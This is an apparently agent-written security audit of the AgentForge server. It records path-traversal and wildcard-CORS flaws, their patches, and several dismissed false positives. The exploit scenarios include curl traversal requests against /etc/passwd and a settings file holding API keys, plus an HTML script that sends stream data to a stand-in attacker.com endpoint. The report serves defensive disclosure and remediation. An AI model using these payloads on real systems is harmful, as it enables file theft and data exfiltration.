# Security Audit — `packages/server/` — 2026-05-15

**Auditor:** CodeReviewer agent (AgentForge)
**Scope:** CORS headers · auth middleware bypass paths · `.agentforge/` path-sanitization · user-controlled values reaching `child_process.spawn`
**Methodology:** Static analysis with six parallel false-positive filter agents; findings below threshold (confidence < 8) excluded

---

## Executive Summary

Four confirmed vulnerabilities were identified across two audit runs. The first audit (same day, earlier cycle) patched two HIGH-severity path traversal issues in `run.ts` and `agent-crud.ts`. This audit (v15.0.0 sprint) patched two additional findings:

- **MAJOR** — `GET /api/v5/stream/response/:taskId` set `Access-Control-Allow-Origin: *`, bypassing the Fastify CORS plugin
- **MAJOR** — `GET /api/v5/sprints/:version` used the `version` URL parameter directly in `path.join()` with no sanitization, allowing `.agentforge/sprints/` directory escape

Both are patched. Previous assessment of the sprints endpoint as "NOT EXPLOITABLE" was incorrect — the Fastify router does not strip `..` segments within URL parameters, only between `/` separators.

---

## PATCHED — Vuln 1: Path Traversal via `projectRoot` in POST /api/v5/run

**File:** `packages/server/src/routes/v5/run.ts` (previously lines 154–162)
**Severity:** HIGH
**Confidence:** 9/10

### Description

The `projectRoot` field was accepted from the unauthenticated POST request body without any schema validation, allowlist check, or path normalization. It was used directly as the root directory for filesystem operations:

```ts
const root = projectRoot ?? DEFAULT_PROJECT_ROOT;
const agentforgeDir = join(root, '.agentforge');
const config = await loadAgentConfig(agentId, agentforgeDir);
// → readFile(join(agentforgeDir, 'agents', `${agentId}.yaml`))
```

Combined with the equally-unsanitized `agentId` body parameter (see Vuln 2), this allowed an attacker to read arbitrary YAML-parseable files from any location the server process could access.

### Exploit Scenario

```bash
# Read a crafted YAML from an attacker-controlled directory
curl -X POST http://localhost:4751/api/v5/run \
  -H 'Content-Type: application/json' \
  -d '{"agentId":"malicious","task":"x","projectRoot":"/tmp/evil"}'
# → server loads /tmp/evil/.agentforge/agents/malicious.yaml
# → attacker controls the agent system prompt and runtime config
```

### Fix Applied

Removed `projectRoot` from `RunRequestBody`. The handler now always uses `DEFAULT_PROJECT_ROOT` (derived from the server's own `__dirname`) — the server knows its root at startup and has no legitimate reason to accept an override from individual API callers.

---

## PATCHED — Vuln 2: Path Traversal via `:id` parameter in Agent Routes

**Files:**
- `packages/server/src/routes/v5/agents.ts` (GET `:id`, POST `:id/run`, GET `:id/scorecard`)
- `packages/server/src/routes/v5/agent-crud.ts` (PATCH `:id`, DELETE `:id`, POST `:id/fork`, POST `:id/promote`)

**Severity:** HIGH
**Confidence:** 9/10

### Description

The `agentId` / `id` URL parameter was used in `path.join` without `../` sanitization:

```ts
// agents.ts
const filePath = join(agentforgeDir, 'agents', `${agentId}.yaml`);
// agent-crud.ts
function agentFilePath(id: string): string {
  return join(agentsDir, `${id}.yaml`);
}
```

A kebab-case regex validator existed **only on the POST create body** (`id` field). The `id` URL parameter used by GET, PATCH, DELETE, fork, and promote carried no equivalent validation — a `../` sequence in the URL path segment would escape `.agentforge/agents/` and reach any file on the filesystem.

Confirmed impact:

| Operation | Vector | Effect |
|-----------|--------|--------|
| `GET /api/v5/agents/../../config/settings` | Read traversal | Reads `.agentforge/config/settings.yaml` |
| `PATCH /api/v5/agents/../../../../etc/passwd` | Write traversal | Could overwrite arbitrary YAML files |
| `DELETE /api/v5/agents/../../config/models` | Delete traversal | Deletes arbitrary YAML files |

### Fix Applied

Three layered defences:

1. **`packages/server/src/lib/safe-join.ts`** — new shared utility that resolves paths with `path.resolve` and asserts containment (`resolved.startsWith(base + sep)`), returning `null` on escape. Extracted from the existing pattern in `cycles.ts` where path safety was already implemented correctly.

2. **Regex guard on all `:id` handlers** — `SAFE_AGENT_ID = /^[a-z0-9]+(?:-[a-z0-9]+)*$/` validated at the start of every route handler that takes an `:id` URL parameter, returning HTTP 400 on failure.

3. **`agentFilePath()` return type changed to `string | null`** — uses `safeJoin` internally; all call sites now handle the null case explicitly, providing defence-in-depth even if the regex guard is bypassed.

---

## NOT EXPLOITABLE — Auth Module Not Registered

**Confidence:** 3/10 (FALSE POSITIVE)

The OAuth2 auth module (`lib/auth/plugin.ts`) is fully implemented but `registerOAuth2Hook()` is never called from `server.ts`. However, this is **not a vulnerability in practice** because:
- The server binds exclusively to `127.0.0.1` (hardcoded default)
- CORS is restricted to localhost origins only
- The auth module appears to be forward-looking infrastructure for a future network-exposed deployment

**Recommendation for next cycle:** When the server is ever bound to a non-loopback interface (e.g., for multi-user or network deployment), the auth hook must be registered. Consider adding a startup assertion that fails if `HOST !== '127.0.0.1'` and the auth hook is not configured.

---

## NOT EXPLOITABLE — CORS Origin Reflection in SSE Endpoints (existing endpoints)

**Confidence:** 2/10 (FALSE POSITIVE)

Three SSE endpoints (`stream.ts`, `cycles.ts`, `dashboard-stubs.ts`) manually set `Access-Control-Allow-Origin` by reflecting the `Origin` header when it matches `^https?:\/\/localhost(:\d+)?$`. This is not exploitable because:
- `Access-Control-Allow-Credentials` is never set — browsers will never attach cookies or auth headers
- The regex is strict and does not match external origins
- The server carries no session-based auth, so unauthenticated CORS requests gain nothing extra

---

## PATCHED (this cycle) — Vuln 3: Wildcard CORS on SSE Streaming Endpoint

**File:** `packages/server/src/routes/v5/streaming.ts` (line 34 before patch)
**Severity:** MAJOR
**Confidence:** 9/10

### Description

`GET /api/v5/stream/response/:taskId` used `reply.raw.writeHead()` to bypass the Fastify CORS plugin, setting `Access-Control-Allow-Origin: *`. The other three SSE endpoints in the codebase had already been corrected to use localhost-scoped CORS reflection; this endpoint was the remaining outlier.

Although the current `SIMULATED_RESPONSES` dictionary contains only static placeholder text, the endpoint is structurally designed to stream real agent task output. A wildcard CORS header would allow any attacker-controlled webpage to open a cross-origin `EventSource` to this endpoint and read streamed agent data, internal task handle identifiers (`stream_<timestamp>`, `taskId`), and response content.

### Exploit Scenario

```html
<!-- attacker.com/steal.html -->
<script>
  const es = new EventSource('http://localhost:4751/api/v5/stream/response/task-123');
  es.onmessage = e => fetch('https://attacker.com/exfil', { method: 'POST', body: e.data });
</script>
```

Any user who visits `attacker.com/steal.html` while the AgentForge server is running on localhost leaks streamed agent output to the attacker.

### Fix Applied

Replaced the hardcoded `'Access-Control-Allow-Origin': '*'` with the localhost-reflect pattern already used in `stream.ts`, `cycles.ts` (log stream), and `dashboard-stubs.ts` (memory stream):

```ts
const reqOrigin = req.headers['origin'];
const isLocalhost = typeof reqOrigin === 'string' &&
  /^https?:\/\/localhost(:\d+)?$/.test(reqOrigin);
const corsOrigin = isLocalhost ? reqOrigin : 'http://localhost:4751';

reply.raw.writeHead(200, {
  ...
  'Access-Control-Allow-Origin': corsOrigin,
  ...
});
```

---

## PATCHED (this cycle) — Vuln 4: Path Traversal in GET /api/v5/sprints/:version

**File:** `packages/server/src/routes/v5/sprints.ts` (lines 170–172 before patch)
**Severity:** MAJOR
**Confidence:** 9/10

### Description

The `version` URL parameter was passed directly to `path.join()` without any sanitization:

```ts
const { version } = req.params as { version: string };
const file = join(sprintsDir, `v${version}.json`);
```

The previous audit incorrectly marked this as "NOT EXPLOITABLE" on the assumption that Fastify's router rejects `..` segments. **This assumption is wrong**: Fastify's router treats `/` as the path component separator; `..` within a single URL segment (between two slashes) is decoded and passed verbatim to the route handler. A request to `/api/v5/sprints/..%2F..%2Fetc%2Fpasswd` (or a URL containing literal `..` in the segment) constructs the path `v../../../etc/passwd.json` which `path.resolve()` normalizes to an arbitrary filesystem location.

Any file with the `.json` extension readable by the server process can be exfiltrated. Without the `.json` suffix requirement, this includes any file that happens to parse as valid JSON regardless of extension.

### Exploit Scenario

```bash
# Read /etc/passwd.json or any JSON file outside the sprints dir
curl 'http://localhost:4751/api/v5/sprints/../../../.agentforge/config/settings'
# → constructs: join(sprintsDir, 'v../../../.agentforge/config/settings.json')
# → resolves to: /project/.agentforge/config/settings.json
# → returns full settings contents including API keys stored there
```

### Fix Applied

Two layered defences added to `sprints.ts`:

1. **`SAFE_VERSION` regex guard** — `^[a-zA-Z0-9][a-zA-Z0-9._-]*$` — the first character must be alphanumeric (which eliminates `..` since it starts with `.`) and no `/` or `%` characters are permitted. Applied before any path construction; returns HTTP 400 on failure.

2. **`safeJoin()` containment** — resolves the final path with `path.resolve()` and asserts the result starts within `sprintsDir`; returns HTTP 400 if containment fails.

The regex is deliberately broader than pure semver (`[0-9]+\.[0-9]+\.[0-9]+`) to accommodate real sprint file naming patterns in the repository: `4.7b`, `phase-active`, `sprint-alpha`, etc.

---

## NOT EXPLOITABLE — spawn CWD Influenced by workspaceId

**Confidence:** 2/10 (FALSE POSITIVE)

`child_process.spawn` in `cycles.ts` uses `cwd: reqProjectRoot` where `reqProjectRoot` is derived from a `workspaceId` query parameter. This is not exploitable because:
- `shell` is not set (defaults to `false`) — no shell metacharacter expansion
- The command and all arguments are hardcoded absolute paths
- `workspaceId` resolves through a registry lookup (`getWorkspace`) that only returns pre-registered paths; an unregistered ID returns a 404

---

## Files Modified (Audit Run 1 — earlier cycle)

| File | Change |
|------|--------|
| `packages/server/src/lib/safe-join.ts` | **Created** — shared path containment utility |
| `packages/server/src/routes/v5/run.ts` | Removed `projectRoot` from request body |
| `packages/server/src/routes/v5/agents.ts` | Added `SAFE_AGENT_ID` guards; switched to `safeJoin` |
| `packages/server/src/routes/v5/agent-crud.ts` | Added `SAFE_AGENT_ID` guards to all mutation handlers; `agentFilePath()` now uses `safeJoin` and returns `string \| null` |

## Files Modified (Audit Run 2 — v15.0.0 sprint, 2026-05-15)

| File | Change |
|------|--------|
| `packages/server/src/routes/v5/streaming.ts` | Replaced `Access-Control-Allow-Origin: *` with localhost-reflect pattern |
| `packages/server/src/routes/v5/sprints.ts` | Added `SAFE_VERSION` regex + `safeJoin()` containment on `:version` param |

---

## Items for Next Cycle

- [ ] **MEDIUM** Add security tests for the two new patches: `GET /api/v5/sprints/..%2Fetc%2Fpasswd` → 400; SSE response endpoint returns non-wildcard `Access-Control-Allow-Origin` for non-localhost origins
- [ ] **MEDIUM** Add integration tests for path traversal rejection: `GET /api/v5/agents/..%2F..%2Fetc%2Fpasswd` → 400, `PATCH /api/v5/agents/../../etc/x` → 400, `POST /api/v5/run` with omitted `projectRoot` field still resolves correctly
- [ ] **LOW** Add a startup assertion in `server.ts`: if `HOST` is not `127.0.0.1` or `localhost`, require the OAuth2 auth hook to be registered (prevents the auth gap from silently opening when the server is later network-exposed)
- [ ] **LOW** Centralise the `SAFE_AGENT_ID` regex into `@agentforge/shared` and import it in both `agents.ts` and `agent-crud.ts` to avoid regex drift between the two files
- [ ] **LOW** Harden `getAgentDefaults()` in `cycles.ts` (line 1027) — add `SAFE_AGENT_ID` validation on `agentId` values read from phase JSON files before using them in `path.join()`. Low priority since the data is server-controlled, but provides defense-in-depth against second-order injection.
